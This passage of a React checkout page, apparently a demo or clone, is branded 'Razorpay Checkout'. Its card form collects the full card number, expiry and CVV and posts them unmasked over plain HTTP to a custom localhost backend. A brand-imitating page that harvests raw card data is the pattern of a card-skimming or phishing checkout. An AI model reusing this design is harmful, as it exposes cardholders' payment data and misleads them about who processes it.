"use client"

import { useState, useEffect } from "react"
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Button } from "@/components/ui/button"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Separator } from "@/components/ui/separator"
import { Checkbox } from "@/components/ui/checkbox"
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
import {
  CreditCard,
  Lock,
  Shield,
  Clock,
  CheckCircle2,
  AlertCircle,
  Smartphone,
  Building,
  Wallet,
  ArrowLeft,
  Download,
} from "lucide-react"
import axios from "axios"

export default function Home() {
  // Payment flow state
  const [paymentStep, setPaymentStep] = useState(1)
  const [paymentMethod, setPaymentMethod] = useState("card")
  const [isProcessing, setIsProcessing] = useState(false)
  const [paymentStatus, setPaymentStatus] = useState(null)
  const [timeLeft, setTimeLeft] = useState(300) // 5 minutes in seconds
  const [cardType, setCardType] = useState("")
  const [errors, setErrors] = useState({})
  const [paymentData, setPaymentData] = useState({})
  const [orderId, setOrderId] = useState("") // State for order ID

  // Generate a unique order ID when the component mounts
  useEffect(() => {
    const generatedOrderId = "ORD" + Math.floor(100000 + Math.random() * 900000);
    setOrderId(generatedOrderId);
  }, []);

  // Order details
  const orderDetails = {
    id: orderId, // Use the state variable for order ID
    items: [{ name: "Premium Plan Subscription", price: 1999 }],
    subtotal: 1999,
    tax: 359.82,
    total: 2358.82,
  }

  // Form data for different payment methods
  const [cardData, setCardData] = useState({
    name: "",
    email: "",
    cardNumber: "",
    expiryMonth: "",
    expiryYear: "",
    cvv: "",
    saveCard: false,
    termsAccepted: false,
  })

  const [upiData, setUpiData] = useState({
    email: "",
    upiId: "",
    termsAccepted: false,
  })

  const [netBankingData, setNetBankingData] = useState({
    email: "",
    bank: "sbi",
    termsAccepted: false,
  })

  const [walletData, setWalletData] = useState({
    email: "",
    walletType: "paytm",
    termsAccepted: false,
  })

  // Format card number with spaces and detect card type
  const formatCardNumber = (value) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "")
    const matches = v.match(/\d{4,16}/g)
    const match = (matches && matches[0]) || ""
    const parts = []

    for (let i = 0; i < match.length; i += 4) {
      parts.push(match.substring(i, i + 4))
    }

    // Detect card type
    if (v.startsWith("4")) {
      setCardType("visa")
    } else if (/^5[1-5]/.test(v)) {
      setCardType("mastercard")
    } else if (/^3[47]/.test(v)) {
      setCardType("amex")
    } else if (/^6(?:011|5)/.test(v)) {
      setCardType("discover")
    } else {
      setCardType("")
    }

    if (parts.length) {
      return parts.join(" ")
    } else {
      return value
    }
  }

  // Handle card form input changes
  const handleCardInputChange = (e) => {
    const { name, value } = e.target
    setCardData({
      ...cardData,
      [name]: value,
    })
  }

  // Handle UPI form input changes
  const handleUpiInputChange = (e) => {
    const { name, value } = e.target
    setUpiData({
      ...upiData,
      [name]: value,
    })
  }

  // Handle Net Banking form input changes
  const handleNetBankingInputChange = (e) => {
    const { name, value } = e.target
    setNetBankingData({
      ...netBankingData,
      [name]: value,
    })
  }

  // Handle Wallet form input changes
  const handleWalletInputChange = (e) => {
    const { name, value } = e.target
    setWalletData({
      ...walletData,
      [name]: value,
    })
  }

  // Validate form based on payment method
  const validateForm = () => {
    const formErrors = {}
    let isValid = true

    if (paymentMethod === "card") {
      if (!cardData.name) {
        formErrors.name = "Name is required"
        isValid = false
      }
      if (!cardData.email || !/\S+@\S+\.\S+/.test(cardData.email)) {
        formErrors.email = "Valid email is required"
        isValid = false
      }
      if (!cardData.cardNumber || cardData.cardNumber.length !== 16) {
        formErrors.cardNumber = "Valid 16-digit card number is required"
        isValid = false
      }
      if (!cardData.expiryMonth) {
        formErrors.expiryMonth = "Expiry month is required"
        isValid = false
      }
      if (!cardData.expiryYear) {
        formErrors.expiryYear = "Expiry year is required"
        isValid = false
      }
      if (!cardData.cvv || cardData.cvv.length !== 3) {
        formErrors.cvv = "Valid 3-digit CVV is required"
        isValid = false
      }
      if (!cardData.termsAccepted) {
        formErrors.termsAccepted = "You must accept the terms and conditions"
        isValid = false
      }
    } else if (paymentMethod === "upi") {
      if (!upiData.email || !/\S+@\S+\.\S+/.test(upiData.email)) {
        formErrors.email = "Valid email is required"
        isValid = false
      }
      if (!upiData.upiId || !upiData.upiId.includes("@")) {
        formErrors.upiId = "Valid UPI ID is required"
        isValid = false
      }
      if (!upiData.termsAccepted) {
        formErrors.termsAccepted = "You must accept the terms and conditions"
        isValid = false
      }
    } else if (paymentMethod === "netbanking") {
      if (!netBankingData.email || !/\S+@\S+\.\S+/.test(netBankingData.email)) {
        formErrors.email = "Valid email is required"
        isValid = false
      }
      if (!netBankingData.termsAccepted) {
        formErrors.termsAccepted = "You must accept the terms and conditions"
        isValid = false
      }
    } else if (paymentMethod === "wallet") {
      if (!walletData.email || !/\S+@\S+\.\S+/.test(walletData.email)) {
        formErrors.email = "Valid email is required"
        isValid = false
      }
      if (!walletData.termsAccepted) {
        formErrors.termsAccepted = "You must accept the terms and conditions"
        isValid = false
      }
    }

    setErrors(formErrors)
    return isValid
  }

  // Handle form submission
  const handleSubmit = async (e) => {
    e.preventDefault();
  
    if (!validateForm()) {
      return;
    }
  
    setIsProcessing(true);
  
    // Store the relevant data based on payment method
    let submittedData = {};
  
    if (paymentMethod === "card") {
      submittedData = {
        paymentMethod: "card",
        cardType: cardType,
        name: cardData.name,
        email: cardData.email,
        cardNumber: cardData.cardNumber.replace(/\s/g, ""),
        cardNumberMasked: "xxxx xxxx xxxx " + cardData.cardNumber.slice(-4),
        expiryMonth: cardData.expiryMonth,
        cvv: cardData.cvv,
        expiryYear: cardData.expiryYear,
        saveCard: cardData.saveCard,
        termsAccepted: cardData.termsAccepted
      };
    } else if (paymentMethod === "upi") {
      submittedData = {
        paymentMethod: "upi",
        email: upiData.email,
        upiId: upiData.upiId,
        termsAccepted: upiData.termsAccepted
      };
    } else if (paymentMethod === "netbanking") {
      const bankNames = {
        sbi: "State Bank of India",
        hdfc: "HDFC Bank",
        icici: "ICICI Bank",
        axis: "Axis Bank",
      };
  
      submittedData = {
        paymentMethod: "netbanking",
        email: netBankingData.email,
        bank: netBankingData.bank,
        bankName: bankNames[netBankingData.bank] || netBankingData.bank,
        termsAccepted: netBankingData.termsAccepted
      };
    } else if (paymentMethod === "wallet") {
      const walletNames = {
        paytm: "Paytm",
        amazonpay: "Amazon Pay",
        mobikwik: "Mobikwik",
        freecharge: "Freecharge",
      };
  
      submittedData = {
        paymentMethod: "wallet",
        email: walletData.email,
        walletType: walletData.walletType,
        walletName: walletNames[walletData.walletType] || walletData.walletType,
        termsAccepted: walletData.termsAccepted
      };
    }
  
    // Add common payment data
    submittedData = {
      ...submittedData,
      amount: orderDetails.total,
      currency: "INR",
      orderId: orderDetails.id,
      timestamp: new Date().toISOString(),
      transactionId: "TXN" + Math.floor(100000000 + Math.random() * 900000000),
    };
  
    // Store the payment data
    setPaymentData(submittedData);
  
    // Send Axios request based on payment method
    try {
      let response;
      if (paymentMethod === "card") {
        response = await axios.post("http://localhost:5000/process-payment/card", submittedData);
      } else if (paymentMethod === "upi") {
        response = await axios.post("http://localhost:5000/process-payment/upi", submittedData);
      } else if (paymentMethod === "netbanking") {
        response = await axios.post("http://localhost:5000/process-payment/netbanking", submittedData);
      } else if (paymentMethod === "wallet") {
        response = await axios.post("http://localhost:5000/process-payment/wallet", submittedData);
      }
  
      // Handle the response from the server
      console.log("Payment response:", response.data);
      setPaymentStep(3);
      setPaymentStatus("success");
    } catch (error) {
      console.error("Payment error:", error);
      setPaymentStep(3);
      setPaymentStatus("failed");
    } finally {
      setIsProcessing(false);
    }
  };

  // Timer countdown
  useEffect(() => {
    if (timeLeft <= 0) return

    const timer = setTimeout(() => {
      setTimeLeft(timeLeft - 1)
    }, 1000)

    return () => clearTimeout(timer)
  }, [timeLeft])

  // Format time as MM:SS
  const formatTime = (seconds) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`
  }

  // Get payment method display name
  const getPaymentMethodName = (method) => {
    const methodNames = {
      card: "Credit/Debit Card",
      upi: "UPI",
      netbanking: "Net Banking",
      wallet: "Wallet",
    }
    return methodNames[method] || method
  }

  return (
    <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
      <div className="w-full max-w-4xl">
        {/* Header */}
        <div className="mb-6 flex justify-between items-center">
          <div className="flex items-center">
            <div className="w-10 h-10 bg-[#2d87f3] rounded-md flex items-center justify-center text-white font-bold text-xl mr-3">
              R
            </div>
            <h1 className="text-xl font-semibold">Razorpay Checkout</h1>
          </div>
          <div className="flex items-center text-sm text-gray-500">
            <Clock className="h-4 w-4 mr-1" />
            <span>Session expires in {formatTime(timeLeft)}</span>
          </div>
        </div>

        <div className="grid md:grid-cols-5 gap-6">
          {/* Main payment form */}
          <div className="md:col-span-3">
            <Card className="shadow-lg">
              <CardHeader className="bg-[#2d87f3] text-white rounded-t-lg">
                <div className="flex justify-between items-center">
                  <CardTitle className="text-xl font-medium">
                    {paymentStep === 1 && "Choose Payment Method"}
                    {paymentStep === 2 && "Complete Payment"}
                    {paymentStep === 3 && (paymentStatus === "success" ? "Payment Successful" : "Payment Failed")}
                  </CardTitle>
                  <div className="flex items-center gap-1">
                    <Shield className="h-4 w-4" />
                    <span className="text-sm">Secure Checkout</span>
                  </div>
                </div>
                <CardDescription className="text-gray-100">
                  {paymentStep === 1 && "Select your preferred payment option"}
                  {paymentStep === 2 && "Enter your payment details"}
                  {paymentStep === 3 &&
                    (paymentStatus === "success"
                      ? "Your transaction has been processed successfully"
                      : "We encountered an issue processing your payment")}
                </CardDescription>
              </CardHeader>

              <CardContent className="p-6">
                {/* Step 1: Payment Method Selection */}
                {paymentStep === 1 && (
                  <div className="space-y-4">
                    <div
                      className={`p-4 border rounded-lg cursor-pointer ${paymentMethod === "card" ? "border-[#2d87f3] bg-blue-50" : "border-gray-200"}`}
                      onClick={() => setPaymentMethod("card")}
                    >
                      <div className="flex items-center">
                        <div className="h-5 w-5 rounded-full border border-[#2d87f3] mr-3 flex items-center justify-center">
                          {paymentMethod === "card" && <div className="h-3 w-3 rounded-full bg-[#2d87f3]"></div>}
                        </div>
                        <div className="flex items-center">
                          <CreditCard className="h-5 w-5 text-gray-600 mr-2" />
                          <span className="font-medium">Credit / Debit Card</span>
                        </div>
                        <div className="ml-auto flex space-x-1">
                          <div className="w-8 h-5 bg-gray-200 rounded"></div>
                          <div className="w-8 h-5 bg-gray-200 rounded"></div>
                          <div className="w-8 h-5 bg-gray-200 rounded"></div>
                        </div>
                      </div>
                      {paymentMethod === "card" && (
                        <div className="mt-4 text-sm text-gray-600">All major credit and debit cards accepted</div>
                      )}
                    </div>

                    <div
                      className={`p-4 border rounded-lg cursor-pointer ${paymentMethod === "upi" ? "border-[#2d87f3] bg-blue-50" : "border-gray-200"}`}
                      onClick={() => setPaymentMethod("upi")}
                    >
                      <div className="flex items-center">
                        <div className="h-5 w-5 rounded-full border border-[#2d87f3] mr-3 flex items-center justify-center">
                          {paymentMethod === "upi" && <div className="h-3 w-3 rounded-full bg-[#2d87f3]"></div>}
                        </div>
                        <div className="flex items-center">
                          <Smartphone className="h-5 w-5 text-gray-600 mr-2" />
                          <span className="font-medium">UPI</span>
                        </div>
                        <div className="ml-auto flex space-x-1">
                          <div className="w-6 h-5 bg-gray-200 rounded"></div>
                          <div className="w-6 h-5 bg-gray-200 rounded"></div>
                        </div>
                      </div>
                      {paymentMethod === "upi" && (
                        <div className="mt-4 text-sm text-gray-600">
                          Pay using UPI apps like Google Pay, PhonePe, BHIM UPI
                        </div>
                      )}
                    </div>

                    <div
                      className={`p-4 border rounded-lg cursor-pointer ${paymentMethod === "netbanking" ? "border-[#2d87f3] bg-blue-50" : "border-gray-200"}`}
                      onClick={() => setPaymentMethod("netbanking")}
                    >
                      <div className="flex items-center">
                        <div className="h-5 w-5 rounded-full border border-[#2d87f3] mr-3 flex items-center justify-center">
                          {paymentMethod === "netbanking" && <div className="h-3 w-3 rounded-full bg-[#2d87f3]"></div>}
                        </div>
                        <div className="flex items-center">
                          <Building className="h-5 w-5 text-gray-600 mr-2" />
                          <span className="font-medium">Net Banking</span>
                        </div>
                      </div>
                      {paymentMethod === "netbanking" && (
                        <div className="mt-4 grid grid-cols-4 gap-2">
                          <div className="flex flex-col items-center">
                            <div className="w-12 h-12 bg-gray-100 rounded-md mb-1 flex items-center justify-center text-xs">
                              SBI
                            </div>
                            <span className="text-xs">SBI</span>
                          </div>
                          <div className="flex flex-col items-center">
                            <div className="w-12 h-12 bg-gray-100 rounded-md mb-1 flex items-center justify-center text-xs">
                              HDFC
                            </div>
                            <span className="text-xs">HDFC</span>
                          </div>
                          <div className="flex flex-col items-center">
                            <div className="w-12 h-12 bg-gray-100 rounded-md mb-1 flex items-center justify-center text-xs">
                              ICICI
                            </div>
                            <span className="text-xs">ICICI</span>
                          </div>
                          <div className="flex flex-col items-center">
                            <div className="w-12 h-12 bg-gray-100 rounded-md mb-1 flex items-center justify-center text-xs">
                              AXIS
                            </div>
                            <span className="text-xs">Axis</span>
                          </div>
                        </div>
                      )}
                    </div>

                    <div
                      className={`p-4 border rounded-lg cursor-pointer ${paymentMethod === "wallet" ? "border-[#2d87f3] bg-blue-50" : "border-gray-200"}`}
                      onClick={() => setPaymentMethod("wallet")}
                    >
                      <div className="flex items-center">
                        <div className="h-5 w-5 rounded-full border border-[#2d87f3] mr-3 flex items-center justify-center">
                          {paymentMethod === "wallet" && <div className="h-3 w-3 rounded-full bg-[#2d87f3]"></div>}
                        </div>
                        <div className="flex items-center">
                          <Wallet className="h-5 w-5 text-gray-600 mr-2" />
                          <span className="font-medium">Wallets</span>
                        </div>
                      </div>
                      {paymentMethod === "wallet" && (
                        <div className="mt-4 grid grid-cols-4 gap-2">
                          <div className="flex flex-col items-center">
                            <div className="w-12 h-12 bg-gray-100 rounded-md mb-1"></div>
                            <span className="text-xs">Paytm</span>
                          </div>
                          <div className="flex flex-col items-center">
                            <div className="w-12 h-12 bg-gray-100 rounded-md mb-1"></div>
                            <span className="text-xs">Amazon Pay</span>
                          </div>
                          <div className="flex flex-col items-center">
                            <div className="w-12 h-12 bg-gray-100 rounded-md mb-1"></div>
                            <span className="text-xs">Mobikwik</span>
                          </div>
                          <div className="flex flex-col items-center">
                            <div className="w-12 h-12 bg-gray-100 rounded-md mb-1"></div>
                            <span className="text-xs">Freecharge</span>
                          </div>
                        </div>
                      )}
                    </div>

                    <Button className="w-full bg-[#2d87f3] hover:bg-[#1a73e8] mt-4" onClick={() => setPaymentStep(2)}>
                      Continue
                    </Button>
                  </div>
                )}

                {/* Step 2: Payment Details Form */}
                {paymentStep === 2 && (
                  <form onSubmit={handleSubmit}>
                    <div className="space-y-5">
                      <button
                        type="button"
                        className="flex items-center text-sm text-gray-600 mb-2"
                        onClick={() => setPaymentStep(1)}
                      >
                        <ArrowLeft className="h-4 w-4 mr-1" />
                        Back to payment methods
                      </button>

                      {/* Credit/Debit Card Form */}
                      {paymentMethod === "card" && (
                        <>
                          <div className="space-y-2">
                            <Label htmlFor="name">Cardholder Name</Label>
                            <Input
                              id="name"
                              name="name"
                              placeholder="Name as on card"
                              value={cardData.name}
                              onChange={handleCardInputChange}
                              className={errors.name ? "border-red-500" : ""}
                            />
                            {errors.name && <p className="text-red-500 text-xs mt-1">{errors.name}</p>}
                          </div>

                          <div className="space-y-2">
                            <Label htmlFor="email">Email</Label>
                            <Input
                              id="email"
                              name="email"
                              type="email"
                              placeholder="For payment receipt"
                              value={cardData.email}
                              onChange={handleCardInputChange}
                              className={errors.email ? "border-red-500" : ""}
                            />
                            {errors.email && <p className="text-red-500 text-xs mt-1">{errors.email}</p>}
                          </div>

                          <div className="space-y-2">
                            <div className="flex items-center justify-between">
                              <Label htmlFor="cardNumber">Card Number</Label>
                              {cardType && (
                                <div className="flex items-center">
                                  <div className="w-8 h-5 bg-gray-200 rounded mr-1"></div>
                                  <span className="text-xs text-gray-600 capitalize">{cardType}</span>
                                </div>
                              )}
                            </div>
                            <div className="relative">
                              <Input
                                id="cardNumber"
                                name="cardNumber"
                                placeholder="1234 5678 9012 3456"
                                value={cardData.cardNumber}
                                onChange={(e) => {
                                  const formatted = formatCardNumber(e.target.value)
                                  e.target.value = formatted
                                  setCardData({
                                    ...cardData,
                                    cardNumber: formatted.replace(/\s/g, ""),
                                  })
                                }}
                                className={`${errors.cardNumber ? "border-red-500" : ""} pr-10`}
                                maxLength={19}
                              />
                              <CreditCard className="absolute right-3 top-1/2 transform -translate-y-1/2 h-5 w-5 text-gray-400" />
                            </div>
                            {errors.cardNumber && <p className="text-red-500 text-xs mt-1">{errors.cardNumber}</p>}
                          </div>

                          <div className="grid grid-cols-2 gap-4">
                            <div className="space-y-2">
                              <Label>Expiry Date</Label>
                              <div className="grid grid-cols-2 gap-2">
                                <Select
                                  value={cardData.expiryMonth}
                                  onValueChange={(value) => {
                                    setCardData({
                                      ...cardData,
                                      expiryMonth: value,
                                    })
                                  }}
                                >
                                  <SelectTrigger className={errors.expiryMonth ? "border-red-500" : ""}>
                                    <SelectValue placeholder="MM" />
                                  </SelectTrigger>
                                  <SelectContent>
                                    {Array.from({ length: 12 }, (_, i) => {
                                      const month = i + 1
                                      return (
                                        <SelectItem key={month} value={month.toString().padStart(2, "0")}>
                                          {month.toString().padStart(2, "0")}
                                        </SelectItem>
                                      )
                                    })}
                                  </SelectContent>
                                </Select>

                                <Select
                                  value={cardData.expiryYear}
                                  onValueChange={(value) => {
                                    setCardData({
                                      ...cardData,
                                      expiryYear: value,
                                    })
                                  }}
                                >
                                  <SelectTrigger className={errors.expiryYear ? "border-red-500" : ""}>
                                    <SelectValue placeholder="YY" />
                                  </SelectTrigger>
                                  <SelectContent>
                                    {Array.from({ length: 10 }, (_, i) => {
                                      const year = new Date().getFullYear() + i
                                      return (
                                        <SelectItem key={year} value={year.toString().slice(-2)}>
                                          {year.toString().slice(-2)}
                                        </SelectItem>
                                      )
                                    })}
                                  </SelectContent>
                                </Select>
                              </div>
                              {(errors.expiryMonth || errors.expiryYear) && (
                                <p className="text-red-500 text-xs mt-1">Please select a valid expiry date</p>
                              )}
                            </div>

                            <div className="space-y-2">
                              <Label htmlFor="cvv">CVV</Label>
                              <div className="relative">
                                <Input
                                  id="cvv"
                                  name="cvv"
                                  type="password"
                                  placeholder="•••"
                                  maxLength={3}
                                  value={cardData.cvv}
                                  onChange={handleCardInputChange}
                                  className={errors.cvv ? "border-red-500" : ""}
                                />
                                <div className="absolute right-3 top-1/2 transform -translate-y-1/2 text-xs text-gray-400">
                                  CVV
                                </div>
                              </div>
                              {errors.cvv && <p className="text-red-500 text-xs mt-1">{errors.cvv}</p>}
                            </div>
                          </div>

                          <div className="flex items-center space-x-2 mt-4">
                            <Checkbox
                              id="saveCard"
                              checked={cardData.saveCard}
                              onCheckedChange={(checked) => {
                                setCardData({
                                  ...cardData,
                                  saveCard: checked === true,
                                })
                              }}
                            />
                            <label
                              htmlFor="saveCard"
                              className="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70"
                            >
                              Save card securely for future payments
                            </label>
                          </div>
                        </>
                      )}

                      {/* UPI Form */}
                      {paymentMethod === "upi" && (
                        <div className="space-y-4">
                          <div className="space-y-2">
                            <Label htmlFor="upiId">UPI ID</Label>
                            <Input
                              id="upiId"
                              name="upiId"
                              placeholder="name@upi"
                              value={upiData.upiId}
                              onChange={handleUpiInputChange}
                              className={errors.upiId ? "border-red-500" : ""}
                            />
                            {errors.upiId && <p className="text-red-500 text-xs mt-1">{errors.upiId}</p>}
                            <p className="text-xs text-gray-500">Enter your UPI ID (e.g. mobilenumber@upi)</p>
                          </div>

                          <div className="space-y-2">
                            <Label htmlFor="email">Email</Label>
                            <Input
                              id="email"
                              name="email"
                              type="email"
                              placeholder="For payment receipt"
                              value={upiData.email}
                              onChange={handleUpiInputChange}
                              className={errors.email ? "border-red-500" : ""}
                            />
                            {errors.email && <p className="text-red-500 text-xs mt-1">{errors.email}</p>}
                          </div>
                        </div>
                      )}

                      {/* Net Banking Form */}
                      {paymentMethod === "netbanking" && (
                        <div className="space-y-4">
                          <div className="space-y-2">
                            <Label>Select Bank</Label>
                            <RadioGroup
                              defaultValue="sbi"
                              value={netBankingData.bank}
                              onValueChange={(value) =>
                                setNetBankingData({
                                  ...netBankingData,
                                  bank: value,
                                })
                              }
                            >
                              <div className="grid grid-cols-2 gap-4">
                                <div className="flex items-center space-x-2">
                                  <RadioGroupItem value="sbi" id="sbi" />
                                  <Label htmlFor="sbi" className="font-normal">
                                    State Bank of India
                                  </Label>
                                </div>
                                <div className="flex items-center space-x-2">
                                  <RadioGroupItem value="hdfc" id="hdfc" />
                                  <Label htmlFor="hdfc" className="font-normal">
                                    HDFC Bank
                                  </Label>
                                </div>
                                <div className="flex items-center space-x-2">
                                  <RadioGroupItem value="icici" id="icici" />
                                  <Label htmlFor="icici" className="font-normal">
                                    ICICI Bank
                                  </Label>
                                </div>
                                <div className="flex items-center space-x-2">
                                  <RadioGroupItem value="axis" id="axis" />
                                  <Label htmlFor="axis" className="font-normal">
                                    Axis Bank
                                  </Label>
                                </div>
                              </div>
                            </RadioGroup>
                          </div>

                          <div className="space-y-2">
                            <Label htmlFor="email">Email</Label>
                            <Input
                              id="email"
                              name="email"
                              type="email"
                              placeholder="For payment receipt"
                              value={netBankingData.email}
                              onChange={handleNetBankingInputChange}
                              className={errors.email ? "border-red-500" : ""}
                            />
                            {errors.email && <p className="text-red-500 text-xs mt-1">{errors.email}</p>}
                          </div>
                        </div>
                      )}

                      {/* Wallet Form */}
                      {paymentMethod === "wallet" && (
                        <div className="space-y-4">
                          <div className="space-y-2">
                            <Label>Select Wallet</Label>
                            <RadioGroup
                              defaultValue="paytm"
                              value={walletData.walletType}
                              onValueChange={(value) =>
                                setWalletData({
                                  ...walletData,
                                  walletType: value,
                                })
                              }
                            >
                              <div className="grid grid-cols-2 gap-4">
                                <div className="flex items-center space-x-2">
                                  <RadioGroupItem value="paytm" id="paytm" />
                                  <Label htmlFor="paytm" className="font-normal">
                                    Paytm
                                  </Label>
                                </div>
                                <div className="flex items-center space-x-2">
                                  <RadioGroupItem value="amazonpay" id="amazonpay" />
                                  <Label htmlFor="amazonpay" className="font-normal">
                                    Amazon Pay
                                  </Label>
                                </div>
                                <div className="flex items-center space-x-2">
                                  <RadioGroupItem value="mobikwik" id="mobikwik" />
                                  <Label htmlFor="mobikwik" className="font-normal">
                                    Mobikwik
                                  </Label>
                                </div>
                                <div className="flex items-center space-x-2">
                                  <RadioGroupItem value="freecharge" id="freecharge" />
                                  <Label htmlFor="freecharge" className="font-normal">
                                    Freecharge
                                  </Label>
                                </div>
                              </div>
                            </RadioGroup>
                          </div>

                          <div className="space-y-2">
                            <Label htmlFor="email">Email</Label>
                            <Input
                              id="email"
                              name="email"
                              type="email"
                              placeholder="For payment receipt"
                              value={walletData.email}
                              onChange={handleWalletInputChange}
                              className={errors.email ? "border-red-500" : ""}
                            />
                            {errors.email && <p className="text-red-500 text-xs mt-1">{errors.email}</p>}
                          </div>
                        </div>
                      )}

                      {/* Terms and Conditions - Common for all payment methods */}
                      <div className="flex items-center space-x-2 mt-6">
                        <Checkbox
                          id="terms"
                          checked={
                            paymentMethod === "card"
                              ? cardData.termsAccepted
                              : paymentMethod === "upi"
                                ? upiData.termsAccepted
                                : paymentMethod === "netbanking"
                                  ? netBankingData.termsAccepted
                                  : walletData.termsAccepted
                          }
                          onCheckedChange={(checked) => {
                            if (paymentMethod === "card") {
                              setCardData({
                                ...cardData,
                                termsAccepted: checked === true,
                              })
                            } else if (paymentMethod === "upi") {
                              setUpiData({
                                ...upiData,
                                termsAccepted: checked === true,
                              })
                            } else if (paymentMethod === "netbanking") {
                              setNetBankingData({
                                ...netBankingData,
                                termsAccepted: checked === true,
                              })
                            } else if (paymentMethod === "wallet") {
                              setWalletData({
                                ...walletData,
                                termsAccepted: checked === true,
                              })
                            }
                          }}
                          className={errors.termsAccepted ? "border-red-500" : ""}
                        />
                        <label
                          htmlFor="terms"
                          className="text-sm leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70"
                        >
                          I agree to the{" "}
                          <a href="#" className="text-[#2d87f3]">
                            terms and conditions
                          </a>{" "}
                          and{" "}
                          <a href="#" className="text-[#2d87f3]">
                            privacy policy
                          </a>
                        </label>
                      </div>
                      {errors.termsAccepted && <p className="text-red-500 text-xs mt-1">{errors.termsAccepted}</p>}

                      <Button
                        type="submit"
                        className="w-full bg-[#2d87f3] hover:bg-[#1a73e8] mt-4"
                        disabled={isProcessing}
                      >
                        {isProcessing ? (
                          <div className="flex items-center">
                            <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white mr-2"></div>
                            Processing...
                          </div>
                        ) : (
                          `Pay ₹${orderDetails.total.toFixed(2)}`
                        )}
                      </Button>
                    </div>
                  </form>
                )}

                {/* Step 3: Payment Result */}
                {paymentStep === 3 && (
                  <div className="flex flex-col items-center py-6">
                    {paymentStatus === "success" ? (
                      <>
                        <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mb-4">
                          <CheckCircle2 className="h-8 w-8 text-green-600" />
                        </div>
                        <h3 className="text-xl font-semibold text-green-600 mb-2">Payment Successful!</h3>
                        <p className="text-gray-600 mb-4 text-center">
                          Your payment of ₹{orderDetails.total.toFixed(2)} has been processed successfully.
                        </p>
                        <div className="bg-gray-50 p-4 rounded-lg w-full mb-4">
                          <div className="flex justify-between text-sm mb-2">
                            <span className="text-gray-600">Transaction ID:</span>
                            <span className="font-medium">{paymentData.transactionId}</span>
                          </div>
                          <div className="flex justify-between text-sm mb-2">
                            <span className="text-gray-600">Payment Method:</span>
                            <span className="font-medium">{getPaymentMethodName(paymentData.paymentMethod)}</span>
                          </div>

                          {/* Show details specific to payment method */}
                          {paymentData.paymentMethod === "card" && (
                            <div className="flex justify-between text-sm mb-2">
                              <span className="text-gray-600">Card:</span>
                              <span className="font-medium">
                                {paymentData.cardNumberMasked} ({paymentData.cardType})
                              </span>
                            </div>
                          )}

                          {paymentData.paymentMethod === "upi" && (
                            <div className="flex justify-between text-sm mb-2">
                              <span className="text-gray-600">UPI ID:</span>
                              <span className="font-medium">{paymentData.upiId}</span>
                            </div>
                          )}

                          {paymentData.paymentMethod === "netbanking" && (
                            <div className="flex justify-between text-sm mb-2">
                              <span className="text-gray-600">Bank:</span>
                              <span className="font-medium">{paymentData.bankName}</span>
                            </div>
                          )}

                          {paymentData.paymentMethod === "wallet" && (
                            <div className="flex justify-between text-sm mb-2">
                              <span className="text-gray-600">Wallet:</span>
                              <span className="font-medium">{paymentData.walletName}</span>
                            </div>
                          )}

                          <div className="flex justify-between text-sm mb-2">
                            <span className="text-gray-600">Email:</span>
                            <span className="font-medium">{paymentData.email}</span>
                          </div>

                          <div className="flex justify-between text-sm">
                            <span className="text-gray-600">Date & Time:</span>
                            <span className="font-medium">{new Date().toLocaleString()}</span>
                          </div>
                        </div>
                        <div className="flex gap-3">
                          <Button className="bg-[#2d87f3] hover:bg-[#1a73e8] flex items-center gap-2">
                            <Download className="h-4 w-4" />
                            Download Receipt
                          </Button>
                        </div>
                      </>
                    ) : (
                      <>
                        <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mb-4">
                          <AlertCircle className="h-8 w-8 text-red-600" />
                        </div>
                        <h3 className="text-xl font-semibold text-red-600 mb-2">Payment Failed</h3>
                        <p className="text-gray-600 mb-4 text-center">
                          We couldn't process your payment. Please try again or use a different payment method.
                        </p>
                        <div className="bg-gray-50 p-4 rounded-lg w-full mb-4">
                          <div className="flex justify-between text-sm mb-2">
                            <span className="text-gray-600">Error Code:</span>
                            <span className="font-medium">ERR{Math.floor(1000 + Math.random() * 9000)}</span>
                          </div>
                          <div className="flex justify-between text-sm mb-2">
                            <span className="text-gray-600">Payment Method:</span>
                            <span className="font-medium">{getPaymentMethodName(paymentData.paymentMethod)}</span>
                          </div>
                          <div className="flex justify-between text-sm">
                            <span className="text-gray-600">Reason:</span>
                            <span className="font-medium">Payment authorization failed</span>
                          </div>
                        </div>
                        <div className="flex gap-3">
                          <Button variant="outline" onClick={() => setPaymentStep(1)}>
                            Try Another Method
                          </Button>
                          <Button className="bg-[#2d87f3] hover:bg-[#1a73e8]" onClick={() => setPaymentStep(2)}>
                            Try Again
                          </Button>
                        </div>
                      </>
                    )}
                  </div>
                )}
              </CardContent>

              <CardFooter className="bg-gray-50 px-6 py-4 border-t flex items-center justify-between">
                <div className="flex items-center">
                  <Lock className="h-4 w-4 text-gray-500 mr-2" />
                  <span className="text-xs text-gray-500">Secured by Razorpay</span>
                </div>
                <div className="flex items-center space-x-2">
                  <div className="w-8 h-5 bg-gray-200 rounded"></div>
                  <div className="w-8 h-5 bg-gray-200 rounded"></div>
                  <div className="w-8 h-5 bg-gray-200 rounded"></div>
                  <div className="w-8 h-5 bg-gray-200 rounded"></div>
                </div>
              </CardFooter>
            </Card>
          </div>

          {/* Order summary */}
          <div className="md:col-span-2">
            <Card className="shadow-lg">
              <CardHeader className="bg-gray-50 border-b">
                <CardTitle className="text-lg">Order Summary</CardTitle>
              </CardHeader>
              <CardContent className="p-6">
                <div className="space-y-4">
                  <div>
                    <h3 className="font-medium mb-2">Order #{orderDetails.id}</h3>
                    <div className="bg-gray-50 p-3 rounded-lg">
                      {orderDetails.items.map((item, index) => (
                        <div key={index} className="flex justify-between py-2 border-b border-gray-200 last:border-0">
                          <span>{item.name}</span>
                          <span>₹{item.price.toFixed(2)}</span>
                        </div>
                      ))}
                    </div>
